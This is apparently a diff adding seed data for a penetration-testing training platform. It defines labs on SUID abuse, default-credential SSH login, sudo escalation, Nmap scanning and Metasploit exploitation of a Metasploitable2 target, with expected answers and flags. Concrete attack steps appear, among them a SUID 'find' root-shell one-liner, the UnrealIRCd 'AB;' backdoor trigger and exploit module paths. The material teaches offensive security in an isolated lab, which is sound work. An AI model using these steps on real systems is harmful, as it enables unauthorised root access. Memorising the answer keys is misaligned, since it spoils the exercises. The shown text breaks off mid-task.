+    "category": "Post-Exploitation",
+    "estimated_hours": 8.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "c25adea3-a513-43c5-b0bb-4e614b458c1f",
+        "title": "Finding SUID Binaries",
+        "description": "Identify dangerous SUID binaries that can be abused to spawn a root shell.",
+        "difficulty": "advanced",
+        "docker_compose_config": {
+          "services": {
+            "victim": {
+              "image": "kali:latest",
+              "ports": [
+                "22",
+                "80"
+              ]
+            }
+          },
+          "auto_solve_script": "find / -perm -u=s -type f 2>/dev/null\n# /usr/bin/find shows up — abuse it:\nfind . -exec /bin/sh -p \\; -quit"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "fd0c1927-f029-4f87-be58-7b279870f6b9",
+            "title": "Enumerate SUID binaries",
+            "instructions": "Find all SUID binaries on the system. How many are in /usr/bin? Submit the count.",
+            "expected_answer": "12",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "c0db2569-c5ee-45b6-b41f-a787a996178d",
+                "hint_text": "Use find with the -perm flag to locate SUID files.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "65276360-adeb-4924-a2ad-b56cca342bfc",
+                "hint_text": "find / -perm -u=s -type f 2>/dev/null | grep /usr/bin | wc -l",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "477bbc22-ca35-4ccb-97ef-3fd5074b8b8d",
+            "title": "Identify the exploitable one",
+            "instructions": "One of the SUID binaries shouldn't be SUID. Submit its name (just the binary name, no path).",
+            "expected_answer": "find",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "dc626493-f61a-40f1-ac33-158987e5f7c8",
+                "hint_text": "Cross-reference your list with GTFOBins.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "dbf97d54-0471-44e5-a453-7fae0b128524",
+                "hint_text": "The 'find' binary with SUID lets you run commands as root.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "d8d73ad4-7b23-40d5-bf0c-aeaf29afe8bd",
+    "title": "Metasploit Basics",
+    "description": "Exploit a deliberately vulnerable Metasploitable-style target. Cover port scanning, default credential attacks, and privilege escalation to retrieve the root flag.\n\n[SEED-DATA]",
+    "difficulty_level": "intermediate",
+    "category": "Exploitation",
+    "estimated_hours": 3.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "948b695f-1e31-4a9b-b0d0-68f769f45f43",
+        "title": "Exploiting Metasploitable",
+        "description": "Identify open services, log in with default credentials, and escalate privileges to read the root flag on a Metasploitable-style target machine.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "services": {
+            "victim": {
+              "image": "kali:latest",
+              "ports": [
+                "22",
+                "80"
+              ]
+            }
+          },
+          "runtime_slug": "metasploit"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "2fcdca00-fbbf-429e-b7a7-cbe3598530ce",
+            "title": "Port Discovery",
+            "instructions": "Run an nmap service scan on the target at 172.26.0.10.\n\nCommand: nmap -sV 172.26.0.10\n\nWhat service name is running on port 21? (e.g. vsftpd, apache, openssh — just the service name in lowercase)",
+            "expected_answer": "vsftpd",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "c2e8fcf7-0129-431c-896c-fa35999b15cd",
+                "hint_text": "Use nmap -sV 172.26.0.10 to detect service versions on all default ports.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "016020c4-ae11-45e3-bea8-81243334f369",
+                "hint_text": "Look for the line starting with '21/tcp open' — the service name follows 'open'.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "06729c6f-4ced-4a0b-9005-31cc52f85e7e",
+            "title": "Default Credentials",
+            "instructions": "Metasploitable-style machines ship with the username 'msfadmin' and password 'msfadmin'.\n\nConnect via SSH:  ssh msfadmin@172.26.0.10\n\nOnce logged in, run: hostname\n\nSubmit the hostname of the target machine.",
+            "expected_answer": "metasploitable",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "d64d81f6-bd7f-4884-b5fb-485bca893bc0",
+                "hint_text": "Connect with: ssh msfadmin@172.26.0.10  (accept the host key with 'yes')",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "a3d0442e-8444-4750-9393-20e276ca3397",
+                "hint_text": "After login, type: hostname — it returns the machine name.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "06137c09-b24e-44b3-b8cd-e8c05408c53b",
+            "title": "Privilege Escalation — Root Flag",
+            "instructions": "While logged in as msfadmin, escalate to root using sudo and read the flag file.\n\nCommand: echo msfadmin | sudo -S cat /root/flag.txt\n\nSubmit the complete flag string.",
+            "expected_answer": "CyberArcade{meta_pwned_2024}",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "7ea5425c-3ab0-4b6e-9e3f-3bc07218ad8b",
+                "hint_text": "msfadmin can run sudo — the sudo password is also 'msfadmin'.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "030a00b7-aced-4c27-bfed-94bf31635e62",
+                "hint_text": "Full command: echo msfadmin | sudo -S cat /root/flag.txt",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "24fa67b2-f0e5-4148-a242-9f9e5fb92119",
+    "title": "Metasploit & Metasploitable Penetration Testing",
+    "description": "Learn penetration testing fundamentals using the Metasploit Framework against the intentionally vulnerable Metasploitable2 target. Covers network reconnaissance with Nmap, service enumeration, vulnerability identification, and exploitation using real Metasploit modules — all inside a safe, isolated Docker lab environment.",
+    "difficulty_level": "intermediate",
+    "category": "Penetration Testing",
+    "estimated_hours": 8.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "fbad92f0-7f33-4445-adc8-9515c6864b68",
+        "title": "Penetration Testing Concepts",
+        "description": "Before touching any tools, understand the fundamentals: CVE, CVSS, penetration testing methodology, and the Metasploit command structure. No live machine required — theory only.",
+        "difficulty": "beginner",
+        "docker_compose_config": {},
+        "has_auto_solve": false,
+        "max_duration_minutes": 120,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "8468dee3-77a8-43f7-a275-81511819292e",
+            "title": "What does CVE stand for?",
+            "instructions": "**Common Vulnerabilities and Exposures (CVE)** is the global standard for identifying and naming publicly known cybersecurity vulnerabilities.\n\nEach CVE entry has a unique ID in the format **CVE-YEAR-NUMBER** (e.g., `CVE-2021-44228` is the famous Log4Shell vulnerability). The list is maintained by **MITRE Corporation** and is used by security tools, vulnerability scanners, and patch management systems worldwide.\n\nWhen a researcher discovers a vulnerability, they request a CVE ID so the community can track it consistently — the same vulnerability gets the same name regardless of which vendor or tool refers to it.\n\n> **Famous examples:** CVE-2017-0144 (EternalBlue / WannaCry), CVE-2021-44228 (Log4Shell), CVE-2014-0160 (Heartbleed)\n\nWhat does the acronym **CVE** stand for?",
+            "expected_answer": "Common Vulnerabilities and Exposures",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "46b024ff-cdac-45ed-a04e-f439847a34fa",
+                "hint_text": "CVE is maintained by MITRE Corporation.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "9c387e47-666c-4836-8231-f21a3fd2a1ff",
+                "hint_text": "Three words: Common, Vulnerabilities, and Exposures.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "ce3a9a3b-c73d-4526-8852-b40957d1abbe",
+            "title": "What is the first phase of a penetration test?",
+            "instructions": "A penetration test follows a structured methodology with distinct phases. Understanding the order matters — skipping phases leads to missed vulnerabilities or noisy attacks that get detected.\n\n**The five phases of a penetration test:**\n\n1. **Reconnaissance** — Gather information about the target (passive and active)\n2. **Scanning & Enumeration** — Discover open ports, services, and versions\n3. **Exploitation** — Leverage vulnerabilities to gain access\n4. **Post-Exploitation** — Escalate privileges, pivot, maintain persistence\n5. **Reporting** — Document findings and remediation steps\n\nThe very first phase is passive — you collect publicly available information without directly touching the target. This includes WHOIS lookups, DNS enumeration, LinkedIn profiling, and more.\n\nWhat is the **first phase** of a penetration test?",
+            "expected_answer": "reconnaissance",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "f26f51eb-47b5-43a3-9ac0-c0877e91a8e0",
+                "hint_text": "This phase is also called 'information gathering' or 'footprinting'.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "3e1b683c-262b-44de-8ebd-9ff431c7e94a",
+                "hint_text": "The term starts with the letter R.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "c09848dc-a675-4320-93da-805672da879c",
+            "title": "What is the default port for MySQL?",
+            "instructions": "Every network service listens on a **port number** — a 16-bit number (0–65535) that identifies which service should handle incoming traffic. Knowing default ports is essential for both attackers and defenders.\n\n**Common default ports you must know:**\n\n| Port | Service |\n|------|---------|\n| 21   | FTP     |\n| 22   | SSH     |\n| 80   | HTTP    |\n| 443  | HTTPS   |\n| 3306 | ?       |\n| 5432 | PostgreSQL |\n| 27017 | MongoDB |\n\nMetasploitable2 exposes many of these. During our Nmap lab you will see them all.\n\nWhat is the **default TCP port** for MySQL?",
+            "expected_answer": "3306",
+            "autosolve_commands": [],
+            "sort_order": 3,
+            "hints": [
+              {
+                "hint_id": "c0959875-7631-45ec-b20c-f31e1c67b114",
+                "hint_text": "The port number is between 3000 and 4000.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "02a19e53-088e-4105-889f-06e967d373a2",
+            "title": "What Metasploit command searches for modules?",
+            "instructions": "**Metasploit Framework** is the world's most widely used penetration testing platform. Its interactive console, `msfconsole`, gives you access to thousands of exploits, payloads, auxiliary scanners, and post-exploitation modules.\n\n**The basic Metasploit workflow:**\n\n```\nmsfconsole          # start the console\nsearch <keyword>    # find modules\nuse <module_path>   # select a module\ninfo                # read module details\nset RHOSTS <ip>     # configure the target\nset LHOST <ip>      # configure your listener\nrun                 # launch the exploit\n```\n\nBefore you can exploit anything you need to find the right module. Metasploit has over 2,000 exploits — the `search` command filters them by keyword, CVE ID, or platform.\n\n**Example:** `search unreal_ircd` will find the UnrealIRCd backdoor exploit we will use later in this course.\n\nWhat single-word msfconsole command do you use to **search for modules**?",
+            "expected_answer": "search",
+            "autosolve_commands": [],
+            "sort_order": 4,
+            "hints": [
+              {
+                "hint_id": "8a8d0fb8-1602-4b57-a0f6-dce9679d88de",
+                "hint_text": "It's the same word you type into Google every day.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "0f50aee3-2e9b-422f-9d64-735712c02811",
+            "title": "What does CVSS stand for?",
+            "instructions": "Knowing a vulnerability exists is only half the story — you also need to understand **how severe** it is. That's what **CVSS** (Common Vulnerability Scoring System) is for.\n\nCVSS rates vulnerabilities on a **0.0 – 10.0 scale** based on factors like:\n- **Attack Vector** — Network, adjacent, local, or physical?\n- **Attack Complexity** — Is it easy or hard to exploit?\n- **Privileges Required** — Does the attacker need existing credentials?\n- **Impact** — How badly is confidentiality, integrity, or availability affected?\n\n**CVSS severity ranges:**\n\n| Score   | Severity |\n|---------|----------|\n| 0.0     | None     |\n| 0.1–3.9 | Low      |\n| 4.0–6.9 | Medium   |\n| 7.0–8.9 | High     |\n| 9.0–10.0 | **Critical** |\n\nThe vulnerabilities in Metasploitable2 include several **Critical (9.0+)** CVEs — you will exploit two of them in this course.\n\nWhat does **CVSS** stand for?",
+            "expected_answer": "Common Vulnerability Scoring System",
+            "autosolve_commands": [],
+            "sort_order": 5,
+            "hints": [
+              {
+                "hint_id": "851ee584-5ec3-4e02-b840-3979c22fee2b",
+                "hint_text": "CVSS scores of 9–10 are labelled 'Critical'.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "dd36033b-c3a0-4892-8d6d-0a07d11ebc11",
+                "hint_text": "Four words: Common, Vulnerability, Scoring, System.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "21fc0228-1fb6-4472-bc47-edd4098dcff0",
+        "title": "Network Reconnaissance with Nmap",
+        "description": "Launch Nmap against Metasploitable2 to discover all open ports and identify running services with version detection. This is the reconnaissance phase of a real penetration test.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "runtime_slug": "metasploit",
+          "terminal_type": "single"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 2,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "93ef3d98-bd1c-4fb8-9d74-c899ede78f8a",
+            "title": "How many open TCP ports does Metasploitable2 have?",
+            "instructions": "**Nmap** (Network Mapper) is the most widely used port scanner in the world. It discovers live hosts, open ports, running services, and operating systems across a network.\n\n**Launch your terminal** by clicking **Launch Machine** below, then try your first scan:\n\n```\nnmap --open -T4 metasploitable2\n```\n\n**What these flags mean:**\n- `--open` — only show ports that are open (filters out closed/filtered)\n- `-T4` — aggressive timing (faster scan, fine in a lab)\n- `metasploitable2` — the target hostname (resolvable inside this lab network)\n\nYou should see a list of open TCP ports. Count them up — Metasploitable2 is intentionally vulnerable and exposes many services.\n\n**How many open TCP ports** does the default Nmap scan find?",
+            "expected_answer": "11",
+            "autosolve_commands": [
+              "nmap --open -T4 metasploitable2 2>/dev/null",
+              "nmap --open -T4 metasploitable2 2>/dev/null | grep -c '^[0-9]*/tcp'"
+            ],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "3a41c80f-bdf8-4708-951f-99be5c53ad56",
+                "hint_text": "Use the `--open` flag so only open ports are shown.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "38931084-bb73-4252-a289-b332feba5b2d",
+                "hint_text": "Pipe through `grep -c '^[0-9]*/tcp'` to count the lines automatically.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "54e8b588-13d2-4dd7-bc96-91414ceec92b",
+            "title": "What SSH version is running on port 22?",
+            "instructions": "A basic port scan tells you which ports are open, but not what software is running on them. The **`-sV` flag** (service version detection) makes Nmap probe each open port and identify the exact software and version.\n\nRun this command in your terminal:\n\n```\nnmap -sV -p 22 metasploitable2\n```\n\n**What `-sV -p 22` means:**\n- `-sV` — enable service/version detection\n- `-p 22` — scan only port 22 (SSH)\n\nIn the output, look for a line like:\n```\n22/tcp  open  ssh   <software> <version>\n```\n\nKnowing the exact SSH version is important — older versions have known exploits. For example, **OpenSSH 4.7** was released in 2007 and has several vulnerabilities.\n\nWhat is the **SSH software and version** running on port 22? (format: `OpenSSH X.Yp1`)",
+            "expected_answer": "OpenSSH 4.7p1",
+            "autosolve_commands": [
+              "nmap -sV -p 22 metasploitable2 2>/dev/null | grep '22/tcp'",
+              "nmap -sV -p 22 metasploitable2 2>/dev/null | grep -oP 'OpenSSH [0-9.p]+'"
+            ],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "ef0d8a79-367b-476a-8c8c-badc5555fa9c",
+                "hint_text": "Use `nmap -sV -p 22 metasploitable2` to scan just port 22.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "1faf0914-501f-4d57-81ea-64a85d0f43e3",
+                "hint_text": "The answer format is 'OpenSSH X.Yp1' — include the 'p1' suffix.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "aba41a08-0c0f-4fbd-bdfc-94c4b2098e08",
+            "title": "What web server is running on port 80?",
+            "instructions": "Port 80 is the default port for HTTP (unencrypted web traffic). Identifying the web server software and version is a key step — different versions have different vulnerabilities.\n\nRun:\n```\nnmap -sV -p 80 metasploitable2\n```\n\nIn the output, look for the `80/tcp` line. The web server name and version will appear after the protocol label.\n\n**Why this matters:** Apache httpd 2.2.8 was released in 2008. Older Apache versions can be vulnerable to path traversal, buffer overflows, and configuration weaknesses. Metasploitable2 intentionally runs old, vulnerable software.\n\nWhat is the **web server software and version** on port 80? (format: `Apache httpd X.Y.Z`)",
+            "expected_answer": "Apache httpd 2.2.8",
+            "autosolve_commands": [
+              "nmap -sV -p 80 metasploitable2 2>/dev/null | grep '80/tcp'",
+              "nmap -sV -p 80 metasploitable2 2>/dev/null | grep -oP 'Apache httpd [0-9.]+'"
+            ],
+            "sort_order": 3,
+            "hints": [
+              {
+                "hint_id": "bd714030-e24a-4727-8207-049f725b8f5a",
+                "hint_text": "Use `nmap -sV -p 80 metasploitable2` to scan port 80.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "9fd96d4c-90c9-4c59-83ef-f55710d5893a",
+                "hint_text": "The answer starts with 'Apache httpd' followed by the version number.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "78e04d23-34f4-4d6d-929c-62dada22ad4c",
+            "title": "What MySQL version is running on port 3306?",
+            "instructions": "Now scan the database port. MySQL is one of the most common database servers, and knowing its version helps identify applicable exploits.\n\n```\nnmap -sV -p 3306 metasploitable2\n```\n\nLook for the `3306/tcp` line. You will see the MySQL version reported by Nmap's service probes.\n\n**Why this matters:** MySQL 5.0.x has several known vulnerabilities including privilege escalation and information disclosure issues. In real engagements, a discovered database port is always a high-priority target.\n\nWhat is the **MySQL version** on port 3306? (format: `MySQL X.Y.ZZ`)",
+            "expected_answer": "MySQL 5.0.51a",
+            "autosolve_commands": [
+              "nmap -sV -p 3306 metasploitable2 2>/dev/null | grep '3306/tcp'",
+              "nmap -sV -p 3306 metasploitable2 2>/dev/null | grep -oP 'MySQL [0-9.a]+'"
+            ],
+            "sort_order": 4,
+            "hints": [
+              {
+                "hint_id": "cb00aef4-c141-4db7-bbe3-ea8fea7b307c",
+                "hint_text": "Use `nmap -sV -p 3306 metasploitable2`.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "84f99409-3702-4d13-b2f8-00e4f8d75034",
+                "hint_text": "The version starts with `5.0` and has a letter suffix.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "92fb8bdc-a9d6-4d53-aa50-18b5dfaecdae",
+            "title": "What IRC service is running on port 6667?",
+            "instructions": "Port 6667 is the default port for **IRC (Internet Relay Chat)** — a protocol from the 1980s still used today. Metasploitable2 runs a specific IRC server on this port that contains a **critical backdoor vulnerability** (CVE-2010-2075).\n\nScan it:\n```\nnmap -sV -p 6667 metasploitable2\n```\n\nLook for the service name on the `6667/tcp` line.\n\n**Background:** In 2009, an attacker compromised the UnrealIRCd source code distribution server and inserted a backdoor. Anyone who downloaded that version unknowingly ran malicious code. This is called a **supply-chain attack** — the software itself was weaponised before distribution.\n\nWe will exploit this backdoor in a later lab using Metasploit's `exploit/unix/irc/unreal_ircd_3281_backdoor` module.\n\nWhat is the **IRC service name** running on port 6667?",
+            "expected_answer": "UnrealIRCd",
+            "autosolve_commands": [
+              "nmap -sV -p 6667 metasploitable2 2>/dev/null | grep '6667/tcp'",
+              "nmap -sV -p 6667 metasploitable2 2>/dev/null | grep -oP 'UnrealIRCd'"
+            ],
+            "sort_order": 5,
+            "hints": [
+              {
+                "hint_id": "4bdddaad-cc6c-4e50-aea9-a02b2dab2882",
+                "hint_text": "The service has a known backdoor vulnerability (CVE-2010-2075).",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "7e98253c-a2e2-4708-b092-5cc0e9a9cda9",
+                "hint_text": "The answer is a single word.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "2fc905c9-6ea7-4f0b-98cd-14173790a5a3",
+        "title": "Service Enumeration & Banner Grabbing",
+        "description": "Go deeper into discovered services using curl and Nmap banner grabbing to extract PHP version, web titles, VNC protocol, Samba version, and identify exploitable vulnerabilities.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "runtime_slug": "metasploit",
+          "terminal_type": "single"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 3,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "4a3e3aa0-b488-4c42-af1b-0488f0384a94",
+            "title": "What PHP version is the web server running?",
+            "instructions": "HTTP response headers often leak server-side technology information — a goldmine for attackers during enumeration. The `curl -I` command fetches **only the headers** (no body), quickly revealing web server details.\n\nRun in your terminal:\n```\ncurl -s -I http://metasploitable2/\n```\n\nScan through the headers. You are looking for the **`X-Powered-By`** header, which web applications use to advertise the scripting language they run on.\n\n**Example header output:**\n```\nHTTP/1.1 200 OK\nServer: Apache/2.2.8 (Ubuntu)\nX-Powered-By: PHP/x.x.x\n```\n\nWhat is the **full value** of the `X-Powered-By` header? (format: `PHP/X.Y.Z-...`)",
+            "expected_answer": "PHP/5.2.4-2ubuntu5.10",
+            "autosolve_commands": [
+              "curl -s -I http://metasploitable2/ 2>/dev/null | grep -i 'X-Powered-By'",
+              "curl -s -I http://metasploitable2/ 2>/dev/null | grep -oP 'PHP/[0-9.\\-a-z]+'"
+            ],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "b1e642b1-22fe-4c12-b83d-35018791765b",
+                "hint_text": "Use `curl -I http://metasploitable2/` to fetch HTTP headers only.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "0de1ad87-dca7-4773-9eeb-10cc75cc0fff",
+                "hint_text": "Look for the `X-Powered-By` header — it contains the PHP version.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "4cfc424c-dd46-43b8-a89e-005252a1c988",
+            "title": "What is the title of the Metasploitable2 web page?",
+            "instructions": "The HTML `<title>` tag contains the page title shown in the browser tab. For enumeration, it confirms you've reached the right target and can reveal application names or environments.\n\nFetch the page source and extract the title:\n```\ncurl -s http://metasploitable2/ | grep -oP '(?<=<title>)[^<]+'\n```\n\n**What this command does:**\n- `curl -s http://metasploitable2/` — silently fetch the HTML\n- `grep -oP '(?<=<title>)[^<]+'` — extract only the text between `<title>` and `</title>`\n\nWhat is the **exact page title** of the Metasploitable2 default web page?",
+            "expected_answer": "Metasploitable2 - Linux",
+            "autosolve_commands": [
+              "curl -s http://metasploitable2/ 2>/dev/null | grep -oP '(?<=<title>)[^<]+'"
+            ],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "9583c1b6-b48d-4e04-87d3-e67467830594",
+                "hint_text": "Use `curl -s http://metasploitable2/` to get the page source.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "c196d574-89db-47fc-a5f1-df199644b34f",
+                "hint_text": "The title is inside an HTML `<title>` tag.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "03677371-6677-4f53-a313-f8ea81fee62e",
+            "title": "What VNC protocol version is running on port 5900?",
+            "instructions": "**VNC (Virtual Network Computing)** enables remote desktop access. Port 5900 is the standard VNC port. If VNC is exposed without authentication (or with a weak password), an attacker can take full graphical control of the machine.\n\nScan it with Nmap:\n```\nnmap -sV -p 5900 metasploitable2\n```\n\nThe output will identify the VNC software and the **protocol version** it supports. Older protocol versions (like 3.3) offer weaker security.\n\nWhat is the VNC service description on port 5900? (format: `VNC (protocol X.X)`)",
+            "expected_answer": "VNC (protocol 3.3)",
+            "autosolve_commands": [
+              "nmap -sV -p 5900 metasploitable2 2>/dev/null | grep '5900/tcp'",
+              "nmap -sV -p 5900 metasploitable2 2>/dev/null | grep -oP 'VNC \\(protocol [0-9.]+\\)'"
+            ],
+            "sort_order": 3,
+            "hints": [
+              {
+                "hint_id": "a2fffe76-ded1-40e8-9fd2-bebf32bb8a33",
+                "hint_text": "Use `nmap -sV -p 5900 metasploitable2`.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "7c5b6877-f63e-4e1b-845b-ce3e398f3af2",
+                "hint_text": "The answer includes 'protocol' in parentheses — e.g., `VNC (protocol X.X)`.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "e88533cb-8e46-4113-a7ec-1ddec0107162",
+            "title": "What Samba version range is advertised on port 445?",
+            "instructions": "**Samba** implements the SMB (Server Message Block) protocol on Linux, allowing Windows-style file and printer sharing. Port 445 is the primary SMB port.\n\nMetasploitable2 runs an ancient version of Samba that is vulnerable to **CVE-2007-2447**, a critical remote code execution vulnerability known as the **\"username map script\"** exploit — one of the easiest exploits in Metasploit.\n\nScan port 445:\n```\nnmap -sV -p 445 metasploitable2\n```\n\nNmap will report a version range for the Samba service on this port.\n\nWhat is the **Samba version range** reported by Nmap? (format: `Samba smbd X.X - Y.Y`)",
+            "expected_answer": "Samba smbd 3.X - 4.X",
+            "autosolve_commands": [
+              "nmap -sV -p 445 metasploitable2 2>/dev/null | grep '445/tcp'",
+              "nmap -sV -p 445 metasploitable2 2>/dev/null | grep -oP 'Samba smbd [0-9X. -]+'"
+            ],
+            "sort_order": 4,
+            "hints": [
+              {
+                "hint_id": "c9835bce-21df-433f-b794-d2e6e23806a2",
+                "hint_text": "Use `nmap -sV -p 445 metasploitable2`.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "d146d61e-7455-474d-9993-42a105908cd6",
+                "hint_text": "The answer is in the format `Samba smbd X.X - Y.Y` using 'X' for the major version placeholders.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "d0454b4a-c90c-4f76-a785-f44ace0628d6",
+            "title": "What type of vulnerability affects UnrealIRCd on Metasploitable2?",
+            "instructions": "Now that you have identified UnrealIRCd on port 6667, let's understand the vulnerability.\n\n**CVE-2010-2075** is a supply-chain attack: in 2009, an attacker compromised the UnrealIRCd distribution server and inserted malicious code into the source tarball. The backdoor allows **remote command execution** — an attacker can send a specially crafted string to port 6667 that triggers the execution of arbitrary OS commands with the privileges of the IRC server process.\n\n**Attack flow:**\n1. Connect to port 6667\n2. Send: `AB;` followed by a shell command\n3. The backdoor executes the command on the server\n\nThis vulnerability has a Metasploit module (`exploit/unix/irc/unreal_ircd_3281_backdoor`) that automates the entire attack. You will use it in the next lab.\n\nWhat type of vulnerability is CVE-2010-2075 classified as? Enter: **backdoor command execution**",
+            "expected_answer": "backdoor command execution",
+            "autosolve_commands": [],
+            "sort_order": 5,
+            "hints": [
+              {
+                "hint_id": "4ff66940-0c0c-4bc4-a069-7d52fba4bf45",
+                "hint_text": "This was a supply-chain attack — malicious code was inserted into a legitimate release.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "3ffd1bac-b3e2-43b0-9ca2-a00168093591",
+                "hint_text": "The answer is three words describing what the backdoor does.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "29fe0823-2269-4b94-8c60-fe1160349b2c",
+        "title": "Exploitation with Metasploit",
+        "description": "Learn the Metasploit workflow: search, use, set, info, run. Identify the exact exploit modules for UnrealIRCd (CVE-2010-2075) and Samba (CVE-2007-2447) ready to fire in your next session.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "runtime_slug": "metasploit",
+          "terminal_type": "single"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 4,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "84544ff7-a125-4aac-9a6f-967d210ca7aa",
+            "title": "What is the msfconsole command to select a module?",
+            "instructions": "You have identified two critical vulnerabilities on Metasploitable2:\n- **CVE-2010-2075** — UnrealIRCd backdoor (port 6667)\n- **CVE-2007-2447** — Samba username map script (port 445)\n\nNow it's time to exploit them using **Metasploit**.\n\n**The core Metasploit workflow:**\n\n```\n# 1. Search for the module\nsearch unreal_ircd\n\n# 2. Select it\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\n\n# 3. Configure it\nset RHOSTS metasploitable2\nset LHOST <your IP>\n\n# 4. Verify options\nshow options\n\n# 5. Launch\nrun\n```\n\nThe command used in **step 2** — selecting a module — is a single word followed by the full module path.\n\nWhat is the **msfconsole command** used to select a module? (single word)",
+            "expected_answer": "use",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "d8f469c9-77c8-47dd-94b9-1a7fcb4795dc",
+                "hint_text": "After this command you type the full module path, e.g. `use exploit/unix/irc/unreal_ircd_3281_backdoor`.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "5d41208b-811c-482d-8ee5-c623158259ba",
+            "title": "What Metasploit option sets the target IP?",
